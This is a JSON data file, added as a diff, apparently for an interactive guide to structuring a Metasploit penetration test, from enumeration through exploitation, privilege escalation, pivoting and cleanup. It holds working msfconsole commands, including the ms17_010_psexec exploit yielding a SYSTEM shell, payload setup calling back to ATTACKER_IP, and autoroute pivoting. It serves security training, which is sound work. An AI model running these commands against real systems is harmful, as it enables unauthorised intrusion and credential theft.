@@ -1,0 +1,194 @@
+{
+  "schemaVersion": 1,
+  "title": "Metasploit engagement structure",
+  "intro": "How a Metasploit engagement fits together: enumerate, prepare, exploit, escalate, then post-exploitation, and round again for the next target. Open any node for what it means and the msfconsole commands behind it, or walk the module workflow step by step. Use it only against systems you are authorised to test.",
+  "phases": [
+    {
+      "id": "enumeration",
+      "name": "Enumeration",
+      "blurb": "Find out exactly what is running, and which version, before you reach for a module.",
+      "nodes": [
+        {
+          "id": "service-validation",
+          "label": "Service validation",
+          "detail": "Confirm each service and its version. Passive sources first, then active scanning; Metasploit can store the results in its database so later modules pick them up.",
+          "children": [
+            {
+              "id": "passive-scanning",
+              "label": "Passive scanning",
+              "detail": "Learn about the target without sending it anything unusual.",
+              "children": [
+                { "id": "osint", "label": "OSINT", "detail": "Public sources: the organisation's sites, job adverts that name their stack, code repositories, certificate transparency logs." },
+                { "id": "legit-interaction", "label": "Interacting with services legitimately", "detail": "Use the service as an ordinary visitor would: browse the site, read banners and error pages, note versions the service volunteers." },
+                { "id": "whois-dns", "label": "whois / DNS records", "detail": "Registrant and netblock owners from whois; hosts, mail servers and subdomains from DNS records." }
+              ]
+            },
+            {
+              "id": "active-scanning",
+              "label": "Active scanning",
+              "detail": "Probe the target directly to fingerprint services and versions.",
+              "children": [
+                {
+                  "id": "scanners",
+                  "label": "Nmap / Nessus / Nexpose scans",
+                  "detail": "Port and version scans. Run Nmap from inside msfconsole with db_nmap and the hosts and services land in the workspace database.",
+                  "cmd": ["msf6 > workspace -a engagement", "msf6 > db_nmap -sV -p- TARGET", "msf6 > services"]
+                },
+                { "id": "web-id", "label": "Web service identification tools", "detail": "Fingerprint web servers, frameworks and CMS versions (headers, default files, favicons)." },
+                { "id": "built-with", "label": "Built-with identification tools", "detail": "Technology profilers that list the libraries, plugins and hosting behind a site." }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "vuln-research",
+          "label": "Vulnerability research",
+          "detail": "Match each product and version to known vulnerabilities, then find the module that covers it. The research sources feed the first two steps of the module workflow: search, then use.",
+          "children": [
+            { "id": "vulndb", "label": "VulnDB (GUI)", "detail": "Vulnerability database: look up the product and version for known issues." },
+            { "id": "rapid7", "label": "Rapid7 (GUI)", "detail": "Rapid7's vulnerability and module database: each entry names the Metasploit module that covers it." },
+            { "id": "searchsploit", "label": "SearchSploit (CLI)", "detail": "Offline search of the Exploit-DB archive from the terminal.", "cmd": ["searchsploit <product> <version>"] },
+            { "id": "dorking", "label": "Google Dorking (GUI)", "detail": "Targeted search operators to find advisories, write-ups and proof-of-concept code for the version you found." },
+            {
+              "id": "module-anatomy",
+              "label": "Module anatomy",
+              "detail": "Every module path reads <no.> <type>/<os>/<service>/<name>, e.g. 794 exploit/windows/ftp/scriptftp_list. No. is the index from your last search (use it instead of typing the path); type is what the module does; os is the target platform and architecture; service is the vulnerable service (or a general action like gather for a collection module); name is the specific action."
+            },
+            {
+              "id": "module-types",
+              "label": "Module types",
+              "detail": "The type is the first split between modules. Only Auxiliary, Exploit and Post are interactable with use; the rest support those. Auxiliary: scanning, fuzzing, sniffing, admin. Encoders: keep a payload intact to its destination. Exploits: abuse a vulnerability to deliver a payload. NOPs: keep payload sizes consistent across attempts. Payloads: the code that runs on the target and calls back. Plugins: extra scripts loaded into the console. Post: collect, pivot and escalate once you hold a session."
+            },
+            {
+              "id": "msf-search",
+              "label": "search [vuln. name]",
+              "console": true,
+              "detail": "Search the module library. Bare text matches names and descriptions; keywords narrow it, and a leading - excludes. Useful keywords: cve:, type: (exploit/auxiliary/post/payload/encoder/nop/evasion), platform:, port:, rank: (e.g. excellent, or gte400), name:, author:, cve:, edb:, check: (has a check method). -S filters by regex, -s <column> sorts, -u uses the module if there is exactly one result.",
+              "cmd": ["msf6 > search ms17_010", "msf6 > search eternalromance type:exploit", "msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft", "msf6 > search cve:2009 type:exploit platform:-linux"]
+            },
+            {
+              "id": "msf-use",
+              "label": "use [index no.]",
+              "console": true,
+              "detail": "Select a module by its index number from the last search, or by its full path. info prints the targets, required options, references, rank and whether a check method is supported, so read it before firing. The prompt changes to name the module you are in.",
+              "cmd": ["msf6 > use 0", "msf6 exploit(windows/smb/ms17_010_psexec) > info"]
+            }
+          ]
+        }
+      ],
+      "next": { "label": "Proceed to Preparation", "to": "preparation" }
+    },
+    {
+      "id": "preparation",
+      "name": "Preparation",
+      "blurb": "Make sure the module is the right one, and that it will work, before it touches the target.",
+      "nodes": [
+        { "id": "code-auditing", "label": "Code auditing", "detail": "Read the module or exploit source. Know what it sends, what it changes on the target, and whether it can crash the service." },
+        { "id": "dependency-check", "label": "Dependency check", "detail": "Confirm the module's requirements: the exact target version, the gems or libraries it needs, and any service state it assumes." },
+        {
+          "id": "custom-modules",
+          "label": "Importing custom modules",
+          "detail": "A module not in the framework (from Exploit-DB or written yourself) goes under ~/.msf4/modules in the matching folder structure; reload so msfconsole finds it.",
+          "cmd": ["mkdir -p ~/.msf4/modules/exploits/custom", "cp module.rb ~/.msf4/modules/exploits/custom/", "msf6 > reload_all"]
+        }
+      ],
+      "next": { "label": "Proceed to Exploitation", "to": "exploitation" }
+    },
+    {
+      "id": "exploitation",
+      "name": "Exploitation",
+      "blurb": "Set the module's parameters, then run it.",
+      "nodes": [
+        { "id": "run-locally", "label": "Run module locally", "detail": "Try the module against a lab copy of the target first, where a crash costs nothing." },
+        {
+          "id": "set-parameters",
+          "label": "Set parameters",
+          "detail": "Every module needs three things set: its options, a payload, and a target.",
+          "children": [
+            {
+              "id": "msf-options",
+              "label": "Options (show options)",
+              "detail": "The module's settings, shown by show options (or options). Everything with Yes under the Required column must be set before it will run. set applies to this module only; setg sets a global value kept across modules until you restart, handy for RHOSTS and LHOST while you stay on one target. The payload has its own options block (LHOST, LPORT).",
+              "cmd": ["msf6 exploit(...) > show options", "msf6 exploit(...) > set RHOSTS TARGET", "msf6 exploit(...) > setg RHOSTS TARGET", "msf6 exploit(...) > setg LHOST ATTACKER_IP"],
+              "children": [
+                { "id": "opt-uri", "label": "URI", "detail": "The path to the vulnerable application on a web server (often TARGETURI)." },
+                { "id": "opt-proxies", "label": "Proxies", "detail": "Send the module's traffic through a proxy chain." },
+                { "id": "opt-rhost", "label": "RHOST / RPORT", "detail": "The target address (RHOSTS) and service port (RPORT)." },
+                { "id": "opt-usernames", "label": "Usernames", "detail": "A single username or a file of them, for modules that log in." },
+                { "id": "opt-passwords", "label": "Passwords", "detail": "A single password or a file of them." },
+                { "id": "opt-dictionaries", "label": "Dictionaries", "detail": "Wordlists for login and brute-force modules (USER_FILE, PASS_FILE, USERPASS_FILE)." },
+                { "id": "opt-session", "label": "Session", "detail": "An existing session to run through: post and local modules act on a session you already hold." }
+              ]
+            },
+            {
+              "id": "msf-payloads",
+              "label": "Payloads (show payloads)",
+              "detail": "What runs on the target once the exploit lands. show payloads lists only the ones that fit this module. The payload must match your listener and the target's architecture.",
+              "cmd": ["msf6 exploit(...) > show payloads", "msf6 exploit(...) > set payload <index no.>", "msf6 exploit(...) > set LPORT 443"],
+              "children": [
+                { "id": "pl-meterpreter", "label": "Meterpreter", "detail": "Metasploit's in-memory agent, with built-in commands for files, processes, credentials and pivoting." },
+                { "id": "pl-bind", "label": "Shell binds", "detail": "The target opens a listening port and you connect to it. Needs that port reachable from you." },
+                { "id": "pl-reverse", "label": "Reverse shells", "detail": "The target connects back to your listener (LHOST/LPORT). Works through most NAT and inbound filtering." },
+                { "id": "pl-exe", "label": "EXE", "detail": "A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler." }
+              ]
+            },
+            {
+              "id": "msf-targets",
+              "label": "Targets (show targets)",
+              "detail": "The operating system and version the exploit is tuned for. Many modules default to automatic; pick one explicitly when you know the target.",
+              "cmd": ["msf6 exploit(...) > show targets", "msf6 exploit(...) > set target <index no.>"],
+              "children": [
+                { "id": "tg-linux", "label": "Linux", "detail": "Linux targets, often split by distribution or architecture." },
+                { "id": "tg-windows", "label": "Windows", "detail": "Windows targets, often split by version and service pack." },
+                { "id": "tg-macos", "label": "macOS", "detail": "macOS targets." },
+                { "id": "tg-others", "label": "Others", "detail": "Everything else the module supports: BSD, appliances, embedded firmware." }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "msf-run",
+          "label": "Run",
+          "detail": "check first where the module supports it, then fire. run reports the handler starting, confirms the target is vulnerable, and opens a session on success; drop to shell from a Meterpreter session. run -j runs it as a background job. A failed exploit disproves the Metasploit module, not the vulnerability: many need tuning to the target, so the framework supports your manual skills, it does not replace them.",
+          "cmd": ["msf6 exploit(windows/smb/ms17_010_psexec) > check", "msf6 exploit(windows/smb/ms17_010_psexec) > run", "[*] Command shell session 1 opened", "C:\\Windows\\system32> whoami", "nt authority\\system"]
+        }
+      ]
+    },
+    {
+      "id": "privilege-escalation",
+      "name": "Privilege escalation",
+      "blurb": "From the foothold, work up to the highest privilege on the host.",
+      "nodes": [
+        {
+          "id": "pe-vuln-research",
+          "label": "Vulnerability research",
+          "detail": "Enumerate the host from the session and map it to local exploits, which run as local modules against that session.",
+          "cmd": ["meterpreter > run post/multi/recon/local_exploit_suggester", "msf6 > use exploit/windows/local/<suggested>", "msf6 exploit(...) > set SESSION 1"]
+        },
+        { "id": "pe-creds", "label": "Credential gathering", "detail": "Passwords and hashes found on the host can lead to a more privileged account." },
+        { "id": "pe-tokens", "label": "Token impersonation", "detail": "On Windows, a process may hold access tokens of other, more privileged users that the session can take on." }
+      ],
+      "next": { "label": "Return to Enumeration, repeat until highest privilege obtained", "to": "enumeration" }
+    },
+    {
+      "id": "post-exploitation",
+      "name": "Post-exploitation",
+      "blurb": "Use the access you have: reach further, gather what the engagement asks for, and leave nothing behind.",
+      "nodes": [
+        { "id": "post-pivot", "label": "Pivoting to other systems", "detail": "Route traffic through the session to networks only the compromised host can reach.", "cmd": ["meterpreter > run autoroute -s 172.16.5.0/24"] },
+        { "id": "post-creds", "label": "Credential gathering", "detail": "Collect credentials for lateral movement. Record where each one came from." },
+        { "id": "post-exfil", "label": "Data exfiltration", "detail": "Show impact by retrieving the data the scope names, and only that." },
+        { "id": "post-cleanup", "label": "Cleanup", "detail": "Remove every file, account, service and route you added, and log what you removed, so the client is left as you found it." }
+      ],
+      "next": { "label": "Next target", "to": "enumeration" }
+    }
+  ],
+  "workflow": [
+    { "node": "msf-search", "title": "Search for a module", "text": "Search the module library for the vulnerability you found." },
+    { "node": "msf-use", "title": "Use it", "text": "Select the module by its index number, and read info." },
+    { "node": "msf-options", "title": "Set options", "text": "show options, then set each required option, such as RHOSTS." },
+    { "node": "msf-payloads", "title": "Set the payload", "text": "show payloads, then set one that fits your listener and the target's architecture." },
+    { "node": "msf-targets", "title": "Set the target", "text": "show targets, then set the one matching the operating system and version." },
+    { "node": "msf-run", "title": "Run", "text": "check if the module supports it, then run." }
+  ]
+}
